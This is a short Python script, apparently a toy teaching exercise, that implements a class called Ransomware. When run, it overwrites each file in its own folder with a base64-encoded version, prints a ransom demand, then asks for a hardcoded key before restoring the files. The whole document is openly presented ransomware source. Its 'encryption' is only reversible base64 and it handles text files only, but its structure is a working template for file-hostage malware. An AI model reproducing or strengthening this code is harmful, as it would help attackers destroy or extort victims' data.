#!/usr/bin/env python3
import logging
import os
import sys
import base64


class Ransomware:
    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def key(self):
        """ Key used for encryption of data. """
        return "secret"

    def obtain_key(self):
        """ Obtain key from a user. """
        return input("Please enter a key: ")

    def ransom_user(self):
        print(
            "Files have suddenly been encrypted. Please "
            "enter key to decrypt."
            " key: XYZ."
        )

    def encrypt_file(self, filename):
        with open(filename, 'r') as file:
            content = file.read()
        encrypted_data = base64.b64encode(content.encode('utf-8'))
        with open(filename, 'w') as file:
            file.write(encrypted_data.decode('utf-8'))

    def decrypt_file(self, key, filename):
        with open(filename, 'r') as file:
            content = file.read()
        decrypted_data = base64.b64decode(content)
        with open(filename, 'w') as file:
            content = file.write(decrypted_data.decode('utf-8'))

    def get_files_in_folder(self, path):
        files = []
        for file in os.listdir(path):
            if file in ['README.md', sys.argv[0], 'ransomware.py']:   #FIXME flag
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files

    def encrypt_files_in_folder(self, path):
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        for file in files:
            logging.debug(f'Encrypting file: {file}')
            self.encrypt_file(file)
            num_encrypted_files += 1

        self.ransom_user()

        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        key = self.obtain_key()
        if key != self.key:
            print('Wrong key!')
            return

        files = self.get_files_in_folder(path)

        for file in files:
            self.decrypt_file(key, file)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    ransomware = Ransomware('SimpleRansomware')
    path = os.path.dirname(os.path.abspath(__file__))
    number_encrypted_files = ransomware.encrypt_files_in_folder(path)
    print(f'Number of encrypted files: {number_encrypted_files}')

    ransomware.decrypt_files_in_folder(path)